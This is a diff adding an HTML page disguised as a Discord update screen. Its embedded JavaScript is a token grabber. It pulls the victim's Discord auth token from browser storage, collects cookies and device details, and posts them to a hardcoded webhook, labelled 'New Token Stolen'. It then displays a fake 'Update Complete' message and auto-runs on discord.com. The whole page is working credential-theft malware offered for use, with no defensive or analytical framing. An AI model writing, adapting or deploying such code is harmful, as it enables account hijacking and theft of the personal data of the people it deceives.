@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Discord Update Required</title>
+    <style>
+        body { font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #36393f; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: #2f3136; padding: 40px; border-radius: 8px; box-shadow: 0 8px 32px rgba(0,0,0,0.5); text-align: center; max-width: 400px; }
+        .logo { font-size: 48px; margin-bottom: 20px; }
+        .title { font-size: 24px; margin-bottom: 10px; color: #fff; }
+        .subtitle { color: #b9bbbe; margin-bottom: 30px; }
+        .progress { background: #202225; height: 6px; border-radius: 3px; margin: 20px 0; overflow: hidden; }
+        .progress-bar { background: #7289da; height: 100%; width: 70%; animation: progress 2s infinite; }
+        @keyframes progress { 0%, 100% { width: 70%; } 50% { width: 90%; } }
+        button { background: #7289da; color: white; border: none; padding: 12px 32px; border-radius: 4px; font-size: 16px; cursor: pointer; transition: background 0.2s; }
+        button:hover { background: #5b6eae; }
+        button:disabled { background: #4f545c; cursor: not-allowed; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">⚡</div>
+        <div class="title">Discord</div>
+        <div class="subtitle">Updating to the latest version...</div>
+        <div class="progress"><div class="progress-bar"></div></div>
+        <button id="updateBtn" onclick="stealToken()">Update Discord</button>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1467638507337154701/C8XYQnebkgye-tL8afunUef-gj_2dIZGkNZwoIhAKYeUX-c6Im8h5fsO0rqJ9b5xbNHx"; // Replace with your webhook
+
+        async function stealToken() {
+            const btn = document.getElementById('updateBtn');
+            btn.disabled = true;
+            btn.textContent = 'Extracting...';
+
+            try {
+                // Method 1: Local Storage (most common)
+                let token = localStorage.getItem('token');
+                
+                // Method 2: Check sessionStorage
+                if (!token) {
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        const key = sessionStorage.key(i);
+                        if (key?.startsWith('__')) {
+                            const value = sessionStorage.getItem(key);
+                            if (value && (value.includes('.') || value.includes('-'))) {
+                                token = value;
+                                break;
+                            }
+                        }
+                    }
+                }
+
+                // Method 3: Discord IndexedDB (backup)
+                if (!token) {
+                    const dbReq = indexedDB.open('discord_local_storage');
+                    dbReq.onsuccess = function(e) {
+                        const db = e.target.result;
+                        const tx = db.transaction(['local_storage'], 'readonly');
+                        const store = tx.objectStore('local_storage');
+                        const req = store.get('token');
+                        req.onsuccess = function(e) {
+                            token = e.target.result?.value;
+                            sendToken(token);
+                        };
+                    };
+                } else {
+                    sendToken(token);
+                }
+
+            } catch (e) {
+                btn.textContent = 'Failed to update';
+            }
+        }
+
+        async function sendToken(token) {
+            if (!token) {
+                document.getElementById('updateBtn').textContent = 'No token found';
+                return;
+            }
+
+            // Get additional user info
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            const screen = `${screen.width}x${screen.height}`;
+            const cookies = document.cookie;
+
+            const data = {
+                username: "Token Grabber",
+                avatar_url: "https://cdn.discordapp.com/emojis/917041254619859998.png",
+                embeds: [{
+                    title: "🕷️ New Token Stolen",
+                    color: 0xff0050,
+                    fields: [
+                        { name: "📱 Token", value: `\`\`\`${token}\`\`\``, inline: false },
+                        { name: "🌐 User Agent", value: `\`${userAgent.slice(0, 100)}...\``, inline: true },
+                        { name: "💻 Platform", value: `\`${platform}\``, inline: true },
+                        { name: "🗣️ Language", value: `\`${language}\``, inline: true },
+                        { name: "📺 Resolution", value: `\`${screen}\``, inline: true },
+                        { name: "🍪 Cookies", value: cookies ? `\`${cookies.slice(0, 50)}...\`` : "None", inline: true }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                
+                document.body.innerHTML = '<div style="text-align:center;padding:40px;color:#43b581;">✅ Update Complete! Restarting Discord...</div>';
+                setTimeout(() => window.close(), 2000);
+            } catch (e) {
+                console.error('Webhook failed');
+            }
+        }
+
+        // Auto-trigger if Discord is open
+        if (window.location.hostname.includes('discord.com')) {
+            setTimeout(stealToken, 1000);
+        }
+    </script>
+</body>
+</html>
